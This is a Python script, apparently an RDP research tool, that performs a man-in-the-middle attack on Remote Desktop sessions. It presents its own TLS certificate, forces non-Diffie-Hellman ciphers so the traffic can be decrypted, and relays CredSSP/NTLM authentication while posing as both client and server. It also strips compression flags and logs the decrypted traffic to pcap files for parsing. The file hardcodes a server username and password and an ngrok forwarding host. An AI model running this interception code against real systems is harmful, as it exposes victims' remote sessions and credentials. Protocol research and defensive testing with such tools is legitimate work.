#!/usr/bin/env python3
#DiabloHorn http://diablohorn.wordpress.com
#Inspired by: https://labs.portcullis.co.uk/blog/ssl-man-in-the-middle-attacks-on-rdp/
#Resources:
#   http://stackoverflow.com/questions/7574092/python-scapy-wrpcap-how-do-you-append-packets-to-a-pcap-file
#   http://efod.se/media/thesis.pdf

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

import sys
import ssl
# import thread
import threading
import binascii
import time
import re
import queue
import os
import socket

from scapy.all import *

import credssp
import mccp
import stream
from data_model_v2_rdp import Rdp
import parser_v2
import parser_v2_context
import utils

# import sslkeylog
# sslkeylog.set_keylog(os.environ.get('SSLKEYLOGFILE'))  # Or directly specify a path
# sslkeylog.set_keylog('/home/rsa-key-20171202-gcp-aws-cloud9/aws-cloud9-root/rdps2rdp/rdps2rdp/SSLKEYLOGFILE.key')  # Or directly specify a path

# the NON_DH_CHIPHERS was generated using: `openssl ciphers | tr : '\n' | grep -v DH | paste -d: -s`
NON_DH_CIPHERS = "RSA-PSK-AES256-GCM-SHA384:RSA-PSK-CHACHA20-POLY1305:AES256-GCM-SHA384:PSK-AES256-GCM-SHA384:PSK-CHACHA20-POLY1305:RSA-PSK-AES128-GCM-SHA256:AES128-GCM-SHA256:PSK-AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:SRP-RSA-AES-256-CBC-SHA:SRP-AES-256-CBC-SHA:RSA-PSK-AES256-CBC-SHA384:RSA-PSK-AES256-CBC-SHA:AES256-SHA:PSK-AES256-CBC-SHA384:PSK-AES256-CBC-SHA:SRP-RSA-AES-128-CBC-SHA:SRP-AES-128-CBC-SHA:RSA-PSK-AES128-CBC-SHA256:RSA-PSK-AES128-CBC-SHA:AES128-SHA:PSK-AES128-CBC-SHA256:PSK-AES128-CBC-SHA"


BUFF_SIZE = 8192
SOCKET_TIMEOUT_SEC = 0.01
OUTPUTPCAP = "output.pcap"
LISTENCON = ('0.0.0.0', 3389)
# REMOTECON = ('127.0.0.1', 3390)
host_port = '127.0.0.1:3390'
host_port = '8.tcp.ngrok.io:19119'
REMOTECON = (host_port.split(':')[0], int(host_port.split(':')[1]))
SERVER_PORT = int(host_port.split(':')[1])

SERVER_USER_NAME = "runneradmin"
SERVER_PASSWORD = "P@ssw0rd!"




def negotiate_credssp_as_server(sock):
    context = credssp.CredSSPContext(sock.getpeername()[0], None, None, auth_mechanism='ntlm')
    credssp_gen = context.credssp_generator_as_server()#sock)

    # loop through the CredSSP generator to exchange the tokens between the
    # client and the server until either an error occurs or we reached the
    # end of the exchange
    out_token, step_name = next(credssp_gen)
    while True:
        try:
            in_token = sock.recv()
            credssp.print_ts_request(in_token)
            out_token, step_name = credssp_gen.send(in_token)
            print("CredSSP: %s" % step_name)
            sock.send(out_token) # MitM
            credssp.print_ts_request(out_token)
        except StopIteration:
            break
    print("CredSSP: server unkown message")
    sock.send(b'\x00\x00\x00\x00') # MitM

def negotiate_credssp_as_client(sock, username=None, password=None):
    context = credssp.CredSSPContext(sock.getpeername()[0], username, password, auth_mechanism='ntlm')
    certificate = sock.getpeercert(binary_form=True) # must be from ssl.wrap_socket()
    credssp_gen = context.credssp_generator_as_client(certificate)
    
    # loop through the CredSSP generator to exchange the tokens between the
    # client and the server until either an error occurs or we reached the
    # end of the exchange
    out_token, step_name = next(credssp_gen)
    while True:
        try:
            print("CredSSP: %s" % step_name)
            sock.send(out_token) # MitM
            credssp.print_ts_request(out_token)
            in_token = sock.recv()
            credssp.print_ts_request(in_token)
            out_token, step_name = credssp_gen.send(in_token)
        except StopIteration:
            break

# problem:
# * single threaded message processing for both connections
# * log all messages received by each connection
# * pass socket to function (credssp/ssl)
# * pause listening on a connection so that the connection control can be transfered
# * get bytes sent on other connection? should be equal to the bytes recieved
# * receive messages from either connection at the same time, and know which connection the message is from
def handler_v2(stream):
    try:
        useCredSsp = False
        
        print('RDP: clientConnectionRequest RDP_NEG_REQ')
        clientConnectionRequestPdu = stream.client.receive_pdu(blocking=True)
        stream.server.send_pdu(clientConnectionRequestPdu)
        
        print('RDP: serverConnectionConfirm RDP_NEG_RSP')
        pdu = stream.server.receive_pdu(blocking=True)
        if pdu.tpkt.x224.x224_connect.rdpNegReq_header.type == Rdp.Negotiate.RDP_NEG_RSP:
            if pdu.tpkt.x224.x224_connect.rdpNegRsp.selectedProtocol == Rdp.Protocols.PROTOCOL_SSL:
                print('Server requested TLS security')
            elif pdu.tpkt.x224.x224_connect.rdpNegRsp.selectedProtocol in (
                    Rdp.Protocols.PROTOCOL_HYBRID, Rdp.Protocols.PROTOCOL_HYBRID_EX):
                print('Server requested Hybrid security (CredSSP)')
                useCredSsp = True
            else:
                raise ValueError('Server requested unknown security')
        stream.client.send_pdu(pdu)
        
        print('Intercepting rdp SSL session from %s' % clientsock.getpeername()[0])
        with stream.managed_timeout(blocking = True) as _:
            stream.replace_sockets(
                    server = ssl.wrap_socket(stream.server,ssl_version=ssl.PROTOCOL_TLS), 
                    client = ssl.wrap_socket(stream.client, server_side=True,certfile='cert.pem',keyfile='cert.key',ciphers=NON_DH_CIPHERS)#, ssl_version=ssl.PROTOCOL_TLSv1)
                    )
            stream.server.do_handshake() #just in case
            stream.client.do_handshake() #just in case
        
            if useCredSsp:
                print('CredSSP: MitM with Server')
                negotiate_credssp_as_client(stream.server, username=SERVER_USER_NAME, password=SERVER_PASSWORD)
                print('CredSSP: MitM with Client')
                negotiate_credssp_as_server(stream.client)

        print('Passing traffic through unmodified between client and server')
        with stream.managed_timeout(timeout = SOCKET_TIMEOUT_SEC) as _:
            while True:
                if not stream.stream_context.rdp_context.pre_capability_exchange:
                    stream.stream_context.full_pdu_parsing = False
                pdu = stream.client.receive_pdu()
                if pdu:
                    stream.server.send_pdu(pdu)
                pdu = stream.server.receive_pdu()
                if pdu:
                    stream.client.send_pdu(pdu)

    except:
        import traceback
        traceback.print_exc()

        
if __name__ == '__main__':
    True
    False

    if False: # MITM
        print('deleting old pcap file: ', OUTPUTPCAP)
        try:
            os.remove(OUTPUTPCAP)
        except FileNotFoundError:
            pass
        
        class LoggingInterceptor(stream.InterceptorBase):
            def _log_packet(self, buffer, pdu_source, stream_context):
                if pdu_source == parser_v2_context.RdpContext.PduSource.SERVER:
                    source_peer = stream_context.stream.server
                else:
                    source_peer = stream_context.stream.client
                pkt = stream_context.make_tcp_packet(source_peer, buffer)
                # s = hexdump(pkt, dump=True)
                wrpcap(OUTPUTPCAP, pkt, append=True)
                
            def intercept_pdu(self, request_type, pdu_source, pdu, stream_context):
                if request_type == self.RequestType.RECEIVE:
                    self._log_packet(pdu.as_wire_bytes(), pdu_source, stream_context)

            def intercept_raw(self, request_type, pdu_source, data, stream_context):
                if request_type == self.RequestType.RECEIVE:
                    self._log_packet(data, pdu_source, stream_context)
        
        class DisableCompressionInterceptor(stream.InterceptorBase):
            def intercept_pdu(self, request_type, pdu_source, pdu, stream_context):
                if request_type == self.RequestType.RECEIVE:
                    if pdu.has_path('tpkt.mcs.rdp.clientNetworkData'):
                        for chan_def in pdu.tpkt.mcs.rdp.clientNetworkData.payload.channelDefArray:
                            chan_def.options.discard(Rdp.Channel.CHANNEL_OPTION_COMPRESS_RDP)
                            chan_def.options.discard(Rdp.Channel.CHANNEL_OPTION_COMPRESS)
                    if pdu.has_path('tpkt.mcs.rdp.TS_INFO_PACKET'):
                        pdu.tpkt.mcs.rdp.TS_INFO_PACKET.flags.discard(Rdp.Info.INFO_COMPRESSION)
                        pdu.tpkt.mcs.rdp.TS_INFO_PACKET.compressionType = Rdp.Info.PACKET_COMPR_TYPE_8K
                    if pdu.has_path('tpkt.mcs.rdp.TS_DEMAND_ACTIVE_PDU.capabilitySets.virtualChannelCapability'):
                        pdu.tpkt.mcs.rdp.TS_DEMAND_ACTIVE_PDU.capabilitySets.virtualChannelCapability.capabilityData.flags = Rdp.Capabilities.VirtualChannel.VCCAPS_NO_COMPR
                    if pdu.has_path('tpkt.mcs.rdp.TS_CONFIRM_ACTIVE_PDU.capabilitySets.virtualChannelCapability'):
                        pdu.tpkt.mcs.rdp.TS_CONFIRM_ACTIVE_PDU.capabilitySets.virtualChannelCapability.capabilityData.flags = Rdp.Capabilities.VirtualChannel.VCCAPS_NO_COMPR
        
        class DisableGfxInterceptor(stream.InterceptorBase):
            def intercept_pdu(self, request_type, pdu_source, pdu, stream_context):
                if request_type == self.RequestType.RECEIVE:
                    if pdu.has_path('tpkt.mcs.rdp.clientCoreData'):
                        pdu.tpkt.mcs.rdp.clientCoreData.payload.earlyCapabilityFlags.discard(Rdp.UserData.Core.RNS_UD_CS_SUPPORT_DYNVC_GFX_PROTOCOL)
                    if pdu.has_path('tpkt.x224.x224_connect.rdpNegRsp'):
                        pdu.tpkt.x224.x224_connect.rdpNegRsp.flags.discard(Rdp.Negotiate.DYNVC_GFX_PROTOCOL_SUPPORTED)
                    
        interceptors = [
            DisableCompressionInterceptor(),
            DisableGfxInterceptor(),
            LoggingInterceptor(),
        ]
        
        serversock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        serversock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        serversock.bind(LISTENCON)
        serversock.listen(5)
        while True:
            print('waiting for connection...')
            
            clientsock, addr = serversock.accept()
            clientsock.settimeout(SOCKET_TIMEOUT_SEC)
            print('...connected from:', addr)
            
            destsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            destsock.connect(REMOTECON)
            destsock.settimeout(SOCKET_TIMEOUT_SEC)
            # destsock.setblocking(1)
            print('...connected to:', REMOTECON)
            rdp_stream = stream.TcpStream_v2(destsock,clientsock, interceptors)
            # rdp_stream.stream_context.pcap_file_name = OUTPUTPCAP
            rdp_stream.stream_context.rdp_context = parser_v2.RdpContext()
            
            if True: # intercept and decrypte MITM
                handler_v2(rdp_stream)
                
            # if False: # observe only MITM
        
            #     from_client, from_server = TcpStream.create_stream_pair(destsock,clientsock)
            #     print('Passing traffic through uninterpreted from client to server')
            #     threading.Thread(target=trafficloop, args=(from_client,True)).start()
        
            #     print('Passing traffic through uninterpreted from server to client')
            #     threading.Thread(target=trafficloop, args=(from_server,True)).start()
            #     break

    if True: # read/print pcap file
        def no_throw(f):
            def wrap_no_throw(*argv, **kwargs):
                try:
                    return bool(f(*argv, **kwargs))
                except Exception as e:
                    # print(e)
                    return False
            return wrap_no_throw
        def compose(*funcs):
            def wraper(*argv, **kwargs):
                retval = funcs[-1](*argv, **kwargs)
                for f in funcs[:-1][::-1]:
                     retval = f(retval)
                return retval
            return wraper
        def l(x):
            print(x)
            return x
        LOG = l
        NOT = lambda x: not x
        IDENTITY = lambda x: x
            
        
        filters_include = []
        filters_exclude = []
        offset = 0
        limit = 499
        limit = 9999
        
        filters_exclude.extend([
            no_throw(lambda pkt,pdu,rdp_context: Rdp.Security.SEC_AUTODETECT_REQ in pdu.tpkt.mcs.rdp.sec_header.flags), # existance check only
            no_throw(lambda pkt,pdu,rdp_context: Rdp.Security.SEC_AUTODETECT_RSP in pdu.tpkt.mcs.rdp.sec_header.flags), # existance check only
        ])
        
        # OUTPUTPCAP = 'output.win10.full.rail.pcap' ; SERVER_PORT = 18745
        # offset = 15 # connect initial
        # offset = 42 # first mcs channel msg
        # offset = 43 ; limit = 3 # demand active + confirm active
        # offset = 55 # post-setup
        # filters_include.extend([
            # no_throw(lambda pkt,pdu,rdp_context: pdu.tpkt.mcs.rdp.dyvc_create_request), # existance check only
            # no_throw(lambda pkt,pdu,rdp_context: pdu.tpkt.mcs.rdp.dyvc_create_response), # existance check only
            # no_throw(lambda pkt,pdu,rdp_context: pdu.tpkt.mcs.rdp.dyvc_close), # existance check only 
        # ])
        # offset = 62 # first compressed
        # offset = 328 # first RAIL = TS_RAIL_ORDER_HANDSHAKE_EX
        # offset = 340 # TS_RAIL_ORDER_EXEC
        # offset = 370 # suspected compressed server TS_RAIL_ORDER_EXEC_RESULT
        filters_include.extend([
            # no_throw(lambda pkt,pdu,rdp_context: rdp_context.get_channel_by_id(pdu.tpkt.mcs.mcs_user_data.channelId).name == Rdp.Channel.RAIL_CHANNEL_NAME), # static RAIL channel
            # no_throw(lambda pkt,pdu,rdp_context: rdp_context.get_channel_by_id(pdu.tpkt.mcs.rdp.dyvc_data.ChannelId).name == Rdp.Channel.RAIL_CHANNEL_NAME), # dynamic RAIL channel
            # no_throw(lambda pkt,pdu,rdp_context: Rdp.Channel.CHANNEL_FLAG_PACKET_COMPRESSED in pdu.tpkt.mcs.rdp.CHANNEL_PDU_HEADER.flags), 
        ])

        # search for calc.exe
        # filters_include.extend([
        #     no_throw(lambda pkt,pdu,rdp_context: 0 <= pkt[Raw].load.find(b'c\x00a\x00l\x00c\x00.\x00e\x00x\x00e\x00')),
        # ])
        # search for compressed packets
        # filters_include.extend([
        #     no_throw(lambda pkt,pdu,rdp_context: Rdp.ShareDataHeader.PACKET_ARG_COMPRESSED in pdu.tpkt.mcs.rdp.TS_SHAREDATAHEADER.compressionArgs), 
        #     no_throw(lambda pkt,pdu,rdp_context: Rdp.Channel.CHANNEL_FLAG_PACKET_COMPRESSED in pdu.tpkt.mcs.rdp.CHANNEL_PDU_HEADER.flags), 
        # ])
        
        # OUTPUTPCAP = 'output.win10.rail.no-client-compression.pcap' ; SERVER_PORT = 14259
        
        # OUTPUTPCAP = 'output.win10.rail.no-all-compression.pcap' ; SERVER_PORT = 14817
        # offset = 15 ; limit = 1 ; # McsConnectInitialDataUnit
        # offset = 43 ; limit = 1 ; # PDUTYPE_DEMANDACTIVEPDU
        # offset = 442 ; limit = 1 ; # compressed packet suspected compressed server TS_RAIL_ORDER_EXEC_RESULT
        
        # OUTPUTPCAP = 'output.win10.rail.post-mod.all-no-compression.pcap' ; SERVER_PORT = 14817
        # offset = 15 ; limit = 1 ; # McsConnect Initial
        # offset = 16 ; limit = 1 ; # McsConnect Confirm
        # offset = 40 ; limit = 1 ; # PDUTYPE_DEMANDACTIVEPDU

        # OUTPUTPCAP = 'output.win10.rail.no-all-compression.v2.pcap' ; SERVER_PORT = 16740
        # offset = 499 ; limit = 1 ; # TS_RAIL_ORDER_EXEC_RESULT
        # offset = 730 ; limit = 1 ; # TS_RAIL_ORDER_GET_APPID_RESP_EX
        # offset = 736 ; limit = 1 ; # TS_RAIL_ORDER_GET_APPID_RESP_EX
        # offset = 755 ; limit = 1 ; # TS_RAIL_ORDER_GET_APPID_RESP_EX
        # offset = 774 ; limit = 1 ; # TS_RAIL_ORDER_GET_APPID_RESP_EX
        # offset = 903 ; limit = 1 ; # TS_RAIL_ORDER_GET_APPID_RESP_EX

        OUTPUTPCAP = 'output.win10.rail.no-all-compression.no-gfx.failed.pcap' ; SERVER_PORT = 19119 
        # offset = 62 ; limit = 1 ; # fast path
        offset = 64 ; limit = 1 ; # fast path
        
        rdp_context = parser_v2_context.RdpContext()
        i = 0
        pkt_list = rdpcap(OUTPUTPCAP)
        for pkt in pkt_list:
            if pkt[TCP].sport == SERVER_PORT:
                pdu_source = parser_v2_context.RdpContext.PduSource.SERVER
            else:
                pdu_source = parser_v2_context.RdpContext.PduSource.CLIENT
            pdu = parser_v2.parse(pdu_source, pkt[Raw].load, rdp_context)
            if offset <= i and i < offset + limit:

                if (any([f(pkt,pdu,rdp_context) for f in filters_include])
                        or (not any([f(pkt,pdu,rdp_context) for f in filters_exclude])
                            and len(filters_include) == 0)):
                    print('%d %s - len %d - %s' % (i, pdu_source.name, len(pkt[Raw].load), pdu.get_pdu_name(rdp_context)))
                    if limit <= 10:
                        # print(repr(pkt))
                        print(utils.as_hex_str(pkt[Raw].load))
                        print(rdp_context)
                        print(pdu)
                        pdu.as_wire_bytes()
            if offset  + limit + 1 < i: 
                break
            i += 1

    
    if False: # connect as client
        serversock = socket.socket(AF_INET, SOCK_STREAM)
        serversock.connect(REMOTECON)
        sendPdu(serversock, "Server", RDP_NEG_REQ_CREDSSP)
        serverConnectionConfirm = receivePdu(serversock, "Server")
        print('Connection Confirm protocol chosen: %s' % str(serverConnectionConfirm[15]).encode('hex'))
        
        # ssl_ctx = ssl.create_default_context()
        # ssl_ctx.check_hostname = False
        # ssl_ctx.verify_mode = ssl.CERT_NONE
        # sslserversock = ssl_ctx.wrap_socket(serversock)
        sslserversock = ssl.wrap_socket(serversock,ssl_version=ssl.PROTOCOL_TLS)
        sslserversock.do_handshake() #just in case
        negotiate_credssp_as_client(sslserversock, username=SERVER_USER_NAME, password=SERVER_PASSWORD)
                
        # serverCapabilitiesPDU = receivePdu(serversock, "Server")
        # sendPdu(serversock, "Server", CredSSP_PDU_1)
        # serverCapabilitiesPDU = receivePdu(serversock, "Server")
    
    if False: # listen as server only for CredSSP, no passthrough
        serversock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        serversock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        serversock.bind(LISTENCON)
        serversock.listen(5)
        print('waiting for connection...')
        clientsock, addr = serversock.accept()
        print('...connected from:', addr)
        # handler(clientsock,addr)
        
        print('RDP: clientConnectionRequest')
        clientConnectionRequestPdu = receivePdu(clientsock, "Client")
        print('RDP: serverConnectionConfirm')
        sendPdu(clientsock, "Server", RDP_NEG_RSP_CREDSSP)
        print('Intercepting rdp session from %s' % clientsock.getpeername()[0])
        sslclientsock = ssl.wrap_socket(clientsock, server_side=True,certfile='cert.pem',keyfile='cert.key', ciphers=NON_DH_CIPHERS)#,ssl_version=ssl.PROTOCOL_TLSv1)
        sslclientsock.do_handshake() #just in case
        clientsock = None # avoid accidentally reading the encrypted bytes
        print('ssl connection context: %s' % sslclientsock.context)
        print('ssl connection cipher: %s' % (sslclientsock.cipher(),))
        print('ssl connection context: %s' % dir(sslclientsock.context))
        for k in [attr for attr in dir(sslclientsock.context) if not attr.startswith('__')]:
            # if isinstance(v, property):
            v = getattr(sslclientsock.context, k)
            if callable(v):
                continue
            try:
                print("    %s: %s" % (k, v))
            except:
                pass
            
        print('CredSSP: MitM with Client')
        negotiate_credssp_as_server(sslclientsock)
        print('done CredSSP')
        afterCredssp = receivePdu(sslclientsock, "Client")

    
    if False: # parse static data
        raw_msgs = [
            # clientSpnego_raw, 
            # mitm_pdu_1, 
            # client_pdu1_resp, 
            # mitm_pdu_2,
            SPNEGO_CHALLENGE_WINDC,
            # SPNEGO_CHALLENGE_MITM,
            ]
            
        for req_raw in raw_msgs:
            print_ts_request(req_raw)
        
    if False: # parse flags
        from spnego._kerberos import (
            parse_flags,
        )
        from spnego._ntlm_raw.messages import (
            NegotiateFlags,
        )
        import pprint
        pprint.pprint(parse_flags(3800728117, enum_type=NegotiateFlags))
        
    if False: # play with scapy
        tcp = (IP(src='8.8.8.8', dst='127.0.0.1')
            / TCP(sport=63, dport=63, flags='PA', seq=1, ack=1))
        tcp.display()
        